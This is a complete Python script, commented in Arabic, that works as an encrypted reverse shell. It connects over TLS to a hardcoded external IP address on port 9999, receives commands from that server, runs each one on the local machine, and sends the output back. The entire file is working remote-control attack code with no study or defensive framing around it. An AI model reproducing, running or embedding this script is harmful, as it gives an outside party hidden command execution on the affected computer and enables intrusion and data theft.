import socket
import ssl
import subprocess

# مسار الشهادة على جهاز العميل
certfile = "C:/Users/moham/Downloads/server.crt"  # تأكد من أنك نقلت الشهادة إلى هذا المسار
ip = "64.227.73.246"  # عنوان السيرفر
port = 9999  # المنفذ الذي يستخدمه السيرفر

# Client script to connect to the server and execute commands
def connect():
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.load_verify_locations(certfile)  # تحميل شهادة السيرفر للتحقق من الأمان

    # إنشاء الاتصال مع السيرفر عبر SSL
    with socket.create_connection((ip, port)) as sock:
        with context.wrap_socket(sock, server_hostname=ip) as ssock:
            while True:
                cmd = ssock.recv(8192).decode()  # استقبال الأوامر من السيرفر
                if cmd.lower() == "exit":
                    break
                output = subprocess.getoutput(cmd)  # تنفيذ الأمر على العميل
                ssock.sendall(output.encode())  # إرسال النتيجة إلى السيرفر

connect()
